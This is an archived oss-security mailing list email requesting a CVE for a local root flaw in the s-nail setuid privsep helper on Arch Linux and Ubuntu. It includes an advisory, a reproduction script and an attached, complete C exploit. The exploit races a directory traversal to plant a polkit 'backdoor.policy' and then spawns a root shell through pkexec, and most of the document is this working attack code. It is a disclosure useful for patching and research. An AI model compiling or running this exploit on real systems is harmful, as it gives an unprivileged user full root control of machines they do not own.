X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["8327" "Friday" "27" "January" "2017" "22:03:00" "+0100" "wapiflapi" "wapiflapi@yahoo.fr" "<283810e2-2297-c139-39b1-3dde13babd49@yahoo.fr>" "321" "[oss-security] CVE Request: s-nail local root" nil nil nil "1" "2017012721:03:00" "[oss-security] CVE Request: s-nail local root" (number mark "U       wapiflapi@ya Jan 27  321/8327  " thread-indent "\"[oss-security] CVE Request: s-nail local root\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3329 invoked by uid 550); 27 Jan 2017 21:05:14 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 1625 invoked from network); 27 Jan 2017 21:03:15 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=yahoo.fr; s=s2048; t=1485550983; bh=SyTDiTsUhMaK/pGhyuWqxcP3dU63685U21az3kpSiIE=; h=To:From:Subject:Cc:Date:From:Subject; b=oDyjWFP+yoxo/ANOHJvjQrdEJfsJj45Vr/XX2qjVU5Mv6CKburwVJ1KWJn+f7DZhvUnhG/DsZConzwXLufGuQjOnSh9Rx9PBiDQDNE2QG4Xevbho37qGoeLVxsN+lMDlIhg5uAdNFNA8KrOX4f1D7p6jVFa9ZtBieJbXqwJo6AC1EHwzR+cq9NWB1EgYyINhFaS9XfNNqstwOisn64tWcPDyN+a4iOGo2nc/ce8nJtekfqwC1hAZ748/YyiqBr1qhlHd0ptCgPWTeGFT5BUFM9NrbXoxY4++1jfJddstoDlylqYCzW/n5G8GhrroLYXxfPW5N6UaabwhEs0tdU2Gzg==
X-Yahoo-Newman-Id: 632469.59224.bm@smtp114.mail.ir2.yahoo.com
X-Yahoo-Newman-Property: ymail-3
X-YMail-OSG: UIbD9r0VM1mhHKMO_BJJSox12EOoYGqzm91giOy4oJi5tlr
 cCt6sc5xUfl2f6AkEQZCPhs6CNQs4yUAaWGPbrnkblyLppdjfxQOhImZEHk1
 txTJa.aj1ztGOKYOkPWkWLVHtQ0WHOCvtB_UUcGbsi43nBme5wQXd3jtG5lk
 0jRdkV2RxEaGYMRG0cNvQSMW9KqNL8Q6atZUWYGmUOcWxCCejSPY3N7dIn4J
 Nvrx.HliqMDYcLyFl6HHfXTo4FGMXa7dWNqdow0RHa_exp.mxzDlN5mqGwqG
 TjOOKI0P9s7nEANO8mC0nm5w3NF_4_ySuxm5fKvIcGlQ.8Hrdk37rV92Gq6q
 PFk8QB5V7gTXHOwOElSj3rl9KyIR6jbRDvevkHT_ArCoVWjCyx9eKr.mrdob
 1mKzwZvJ4bgdHsmAEJyigJwGMyu7OxTqo.pQSHLjhse.j0jTunGkBN6QM7K3
 YmuEpdv5Sm6aySRqGL1.GwCx_ITXJL0.l7_t2nAgxOkdD8OQfSUrIY_6gFIy
 kflzgabE4q1nXMrO6OFJX2SoEO8kzwWUkzm0VnsFcjr7VxN3nwGtB__PnZA-
 -
X-Yahoo-SMTP: U4ByNJCswBDrWOndmGo3cYknl59DpQ--
To: oss-security@lists.openwall.com
From: wapiflapi <wapiflapi@yahoo.fr>
Cc: Steffen Nurpmeso <steffen@sdaoden.eu>
Message-ID: <283810e2-2297-c139-39b1-3dde13babd49@yahoo.fr>
Date: Fri, 27 Jan 2017 22:03:00 +0100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
 Thunderbird/45.5.1
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="------------EC9266F378D0E47C35CB2628"
Subject: [oss-security] CVE Request: s-nail local root

--------------EC9266F378D0E47C35CB2628
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 7bit

Hi,

s-nail fixed a local root. This affects archlinux by default and other
linux distros' packages (eg. ubuntu). Can we get a CVE for this ?

https://www.mail-archive.com/s-nail-users@lists.sourceforge.net/msg00551.html

Here is the advisory:

Affects
=======

S-nail (later S-mailx) is a mail processing system. It is intended to
provide the functionality of the POSIX mailx command. It is installed by
default on archlinux and is pulled in on ubuntu whenever mailx is
needed. It might be used elsewhere.

There is a vulnerability in the setuid root helper binary s-nail uses to
handle lock files:

  - archlinux: /usr/lib/mail-privsep
  - ubuntu:    /usr/lib/s-nail/s-nail/privsep


Reproducing the issue
=====================

The problem is that an O_EXCL file is created with a user controlled
path because the di.di_hostname and di.di_randstr are never checked.
This means that using s-nail-privsep a normal user can create a file
anywhere on the filesystem, which is a security problem.

The command is very picky about it's arguments. Here is an example
script setting up the bug. This runs the setuid binary under strace so
we can see the call to open() that we control followed by a call to
fchown() giving us ownership.


```
# On archlinux it should be: /usr/lib/mail-privsep
PRIVSEP=/usr/lib/s-nail/s-nail-privsep;

# Some setup to get the directory traversal working.
touch /tmp/foo
mkdir -p /tmp/foo.lock.spam.eggs

cd $(dirname $PRIVSEP);
PATH=$PATH:. # argv[0] must be just the name.

# stdin & stdout must be pipes !
echo | strace -f $(basename $PRIVSEP) rdotlock \
              mailbox /tmp/foo name /tmp/foo.lock \
              hostname spam randstr eggs/../../../../../../../tmp/test \
              pollmsecs 0 |& grep -E "foo\.lock\.spam\.eggs|chown";
```


Security Impact
===============

This issue can be leveraged by any logged in user to gain full root
privileges.

To exploit this we have to win a race condition and find a way to
leverage the ephemeral file. We achieve this by adding a polkit policy
and using pkexec su.

A functional exploit is attached :-) Should look like this:

```
$ id
uid=1000(wapiflapi) gid=1000(wapiflapi) groups=1000(wapiflapi)[...]
$ ./s-nail-privget /usr/lib/s-nail/s-nail-privsep
[=] s-nail-privsep local root by @wapiflapi
[+] Started flood in /usr/share/polkit-1/actions/backdoor.policy
[+] Started race with /usr/lib/s-nail/s-nail-privsep
[=] This could take a while...
[/] wait for it: done
root@box:~# id
uid=0(root) gid=0(root) groups=0(root)
```

If the system doesn't have pkexec there are other ways to get root
access from this. (`at` and `crontab` files come to mind.) The exploit
is a bit slow (20s?), it's probably possible to be smarter about the
race, but it's a poc ! ;-) Also if testing in a VM, having more than one
cpu core helps a lot.


Issue Timeline
==============

discovery:  26/01/2016
disclosure: 27/01/2016
vendor fix: 27/01/2016


Regards,
Wannes `wapiflapi` Rombouts

--------------EC9266F378D0E47C35CB2628
Content-Type: text/x-csrc;
 name="s-nail-privget.c"
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment;
 filename="s-nail-privget.c"

/*
** 26/01/2016: s-nail-privsep local root by @wapiflapi
** The setuid s-nail-privsep binary has a directory traversal bug.
** This lets us be owner of a file at any location root can give us one,
** only for a very short time though. So we have to race a bit :-)
** Here we abuse the vuln by creating a polkit policy letting us call pkexec su.
**
** gcc s-nail-privget.c -o s-nail-privget
**
** # for ubuntu:
** ./s-nail-privget /usr/lib/s-nail/s-nail-privsep
** # for archlinux:
** ./s-nail-privget /usr/lib/mail-privsep
*/

#define _GNU_SOURCE

#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <err.h>

#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>

#define DEBUG	0
#define FOREVER !DEBUG

/*
** Attempts to copy data to target quickly...
*/
int flood(char const *target, char const *data, size_t len) {

  do {
    int fd;
    struct stat stat;

    if ((fd = open(target, O_WRONLY)) < 0) {
      continue;
    }

    write(fd, data, len);
    close(fd);

    // give poor dbus a chance here :-)
    // we don't want to abuse the file.
    usleep(10);

  } while (FOREVER);

  return 0;
}

/*
** This trigger's the vulnerability. (a lot.)
*/
int race(char const *path, char const *target) {

  char *argv[] = {
    NULL, "rdotlock",
    "mailbox",	NULL,  // $TMPDIR/foo
    "name",	NULL, // $TMPDIR/foo.lock
    "hostname",	"spam",
    "randstr",	NULL, // eggs/../../../../../../..$TARGET
    "pollmsecs","0",
    NULL
  };

  char tmpdir[] = "/tmp/tmpdir.XXXXXX";
  char *loldir;

  int fd, pid, inpipe[2], outpipe[2];

  if (!mkdtemp(tmpdir)) {
    err(EXIT_FAILURE, "mkdtemp(%s)", tmpdir);
  }

  if (!(argv[0] = strrchr(path, '/'))) {
    errx(EXIT_FAILURE, "%s is not full path to privsep.", path);
  } else {
    argv[0] += 1; // skip '/'.
  }

  // (nope I'm not going to free those later.)
  if (asprintf(&loldir, "%s/foo.lock.spam.eggs", tmpdir) < 0 ||
      asprintf(&argv[3], "%s/foo", tmpdir) < 0 ||
      asprintf(&argv[5], "%s/foo.lock", tmpdir) < 0 ||
      asprintf(&argv[9], "eggs/../../../../../../..%s", target) < 0) {
    err(EXIT_FAILURE, "asprintf");
  }

  // touch $tmpdir/foo
  if ((fd = open(argv[3], O_WRONLY | O_CREAT, 0640)) < 0) {
    err(EXIT_FAILURE, "open(%s)", argv[3]);
  } else {
    close(fd);
  }

  // mkdir $tmpdir/foo.lock.spam.eggs
  if (mkdir(loldir, 0755) < 0) {
    err(EXIT_FAILURE, "mkdir(%s)", loldir);
  }

  // OK, done setting up the environement & args.
  // Setup some pipes and let's get going.

  if (pipe(inpipe) < 0 || pipe(outpipe) < 0) {
    err(EXIT_FAILURE, "pipe");
  }

  close(inpipe[1]);
  close(outpipe[0]);

  do {

    if ((pid = fork()) < 0) {
      warn("fork");
      continue;
    } else if (pid) {
      waitpid(pid, NULL, 0);
      continue;
    }

    // This is the child, give it the pipes it wants. (-_-')
    if (dup2(inpipe[0], 0) < 0 || dup2(outpipe[1], 1) < 0) {
      err(EXIT_FAILURE, "dup2");
    }

    if (nice(20) < 0) {
      warn("nice");
    }

    execv(path, argv);
    err(EXIT_FAILURE, "execve(%s)", path);

  } while (FOREVER);

  return 0;
}

int main(int argc, char **argv, char **envv) {

  int flood_pid, race_pid, counter;

  char payload[] =							\
    "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"			\
    "<!DOCTYPE policyconfig PUBLIC "					\
    "\"-//freedesktop//DTD PolicyKit Policy Configuration 1.0//EN\" "	\
    "\"http://www.freedesktop.org/software/polkit/policyconfig-1.dtd\">" \
    "<policyconfig><action id=\"org.freedesktop.policykit.exec\"><defaults>" \
    "<allow_any>yes</allow_any>"					\
    "<allow_inactive>yes</allow_inactive>"				\
    "<allow_active>yes</allow_active>"					\
    "</defaults></action></policyconfig>";

  char const *target = "/usr/share/polkit-1/actions/backdoor.policy";

  char *command;

  if (argc != 2) {
    errx(EXIT_FAILURE, "usage: %s /full/path/to/privsep", argv[0]);
  }

  fprintf(stderr, "[=] s-nail-privsep local root by @wapiflapi\n");

  if ((flood_pid = fork()) < 0) {
    err(EXIT_FAILURE, "fork");
  } else if (!flood_pid) {
    return flood(target, payload, sizeof payload);
  }

  fprintf(stderr, "[+] Started flood in %s\n", target);

  if ((race_pid = fork()) < 0) {
    err(EXIT_FAILURE, "fork");
  } else if (!race_pid) {
    return race(argv[1], target);
  }

  fprintf(stderr, "[+] Started race with %s\n", argv[1]);

  // Now let's see if we can get a shell going.
  if (asprintf(&command, "pkexec --disable-internal-agent 2>/dev/null sh -c \""
	       "kill %d %d; echo done;"
	       "python -c 'import pty; pty.spawn(\\\"/bin/bash\\\")'; kill $PPID\"",
	       flood_pid, race_pid) < 0) {
    err(EXIT_FAILURE, "asprintf");
  }

  counter = 0;

  int old = 0, ret;

  fprintf(stderr, "[=] This could take a while...\n");

  while ((ret = system(command)) == old || old == 0) {
    old = ret;
    if (++counter % 9 == 0) {
      fprintf(stderr, "\r[%c] wait for it: ", "|/-\\"[counter % 4]);
    }
  }

  fprintf(stderr, " not in the mood? :(\n");
  return 0;
}

--------------EC9266F378D0E47C35CB2628--
